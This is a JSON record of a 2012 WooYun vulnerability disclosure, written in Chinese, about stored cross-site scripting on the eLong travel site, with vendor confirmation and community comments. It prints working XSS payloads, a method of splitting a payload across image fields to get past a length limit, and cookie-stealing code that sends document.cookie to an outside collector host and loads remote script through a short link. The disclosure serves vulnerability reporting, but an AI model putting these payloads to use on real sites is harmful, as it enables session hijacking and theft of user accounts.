{"id": 17135, "wybug_id": "wooyun-2012-011255", "wybug_title": "艺龙多处存储型XSS，突破长度限制跨妹子@@", "wybug_corp": "艺龙旅行网", "wybug_author": "P1n9y_fly", "wybug_date": "2012-08-24 07:54", "wybug_open_date": "2012-10-08 07:55", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-08-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-08-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-09-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-09-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-09-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-10-08：\t细节向公众公开  简要描述： 各种XSS 详细说明：  1.\t “><img src=1 onerror=alert(1);>1）\t位置：a)\t相册\n\n\n\nb)\t转发\n\nc)\t编辑名称\n\n2）\t利用利用起来非常简单，前两个直接看了就被X，后面那个一个我们抓了一下包：\n\n上面的几个都非常清晰明了的出现在了网页中，直接CSRF修改subject，不论是自己还是别人，各种被跨。2.\t“ onload=”alert(1)”\n\n1）\t位置a)\t直接在相册页面被X\n\nb)\t跑到编辑图片里面被X\n\n2）\t利用同样方便，方法一：直接X；方法二：CSRFX当然还有更方便的“突破长度限制跨艺龙妹子”。3.\t‘;alert(document.cookie);//\n\n1）\t位置a)\t外面：在相册里面看照片\n\nb)\t里面：点进去看照片\n\n2）\t利用最直接，一看就X4.\t突破长度限制跨艺龙妹子！上面说了这么多，但是有个问题，最多只能输入30个字母，想要跨到艺龙妹子，必须突破长度限制才可以。我们可以利用几种XSS配合突破长度限制。我们的跨站代码是\nhttp://kocteg.duapp.com/a.php?v=elong&c=’document.cookie’\n由于长度限制，我们无法使用这个跨站代码。那么就有下面这个办法，将其拆分1：” onload=”g=document.cookie”2：” onload=”h=’http://kocteg’”3：” onload=”h=h+’.duapp.com/a.’”4：” onload=”h=h+’php?v=elong&c’”5：” onload=”h=h+’=’+g”6：’;windows.open(h);//分别放到每个图片里面去\n\n只要妹子一点开这个相册，就被跨了。。。。\n\n收到两条。。。因为duapp设置了啥啥啥，导致IP地址获取不到。。。5.\t原理及修复1）\t第一个：“><img src=1 onerror=alert(1);>\n\n“和>木有过滤2）\t第二个：“ onload=”alert(1)”\n\n“木有过滤3）\t第三个：‘;alert(document.cookie);//\n\n调用后单引号木有过滤   漏洞证明：  之前因为elong过滤了尖括号<>和script关键字，一直不能加载JS，只是通过GET传COOKIE而已，今天早上起来测试了一下成功绕过并加载JS 获得原来超过URL限制不能GET到的超长COOKIE\n<script/src=http://t.cn/zWEGaNi></script>\n上面为加载JS的代码。拆分成\n\" onload=\"h='&lt;scr'\" onload=\"h+='ipt/src=h'\" onload=\"h+='ttp://t.cn/zWEG'\" onload=\"h+='aNi&gt;&lt;/scr'\" onload=\"h+='ipt&gt;'\" onload=\"document.write(h);\n服务器端过滤了<>和script但是客户端并没有。&lt;顺利通过了服务器端通过JS变成了<然后被document.write打印了出来。以下就是获得的超长COOKIE\n\n   修复方案：  以上   版权声明：转载请注明来源 P1n9y_fly@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2012-08-27 09:12 厂商回复： 添加对漏洞的补充说明以及做出评价的理由 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-08-24 09:23 |    \t\tgoderci \t\t\t( 普通白帽子  |\t\t\t        Rank:542 漏洞数:47        | http://www.yunday.org)\t\t \n  ......    \n     2012-08-24 10:07 |    \t\t瘦蛟舞  \t\t\t( 普通白帽子  |\t\t\t        Rank:687 漏洞数:78        | 铁甲依然在)\t\t \n  妖姐不要没事就X客服妹子，妹子搞IT多不容易。    \n     2012-08-24 10:25 |    \t\tP1n9y_fly \t\t\t( 实习白帽子  |\t\t\t        Rank:97 漏洞数:11        | ضصششسسزرذخكللممنيئؤؤ...)\t\t \n  @xsser 昨天网上忘记测试了。。再加一个绕过过滤。。加载任意JS    \n     2012-08-24 10:41 |    \t\tP1n9y_fly \t\t\t( 实习白帽子  |\t\t\t        Rank:97 漏洞数:11        | ضصششسسزرذخكللممنيئؤؤ...)\t\t \n  @瘦蛟舞 没跨妹子。。正儿八经的，，，    \n     2012-08-24 12:59 |    \t\t大和尚 \t\t\t( 实习白帽子  |\t\t\t        Rank:49 漏洞数:5        | www.ieroot.com 积极向上的心态！百折不挠...)\t\t \n  @P1n9y_fly 你rank60了怎么还是实习白帽子？有的rank30都已经是普通白帽子了。帽子怎么升级的？    \n     2012-08-24 15:28 |    \t\tP1n9y_fly \t\t\t( 实习白帽子  |\t\t\t        Rank:97 漏洞数:11        | ضصششسسزرذخكللممنيئؤؤ...)\t\t \n  @大和尚 我也不知道。。咱们的志向可是核心。。路亦远yi。。。。    \n     2012-09-28 16:30 |    \t\t小黑要低调 \t\t\t( 实习白帽子  |\t\t\t        Rank:47 漏洞数:4        | 小黑一枚)\t\t \n  厂商回复也太蛋疼了吧    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}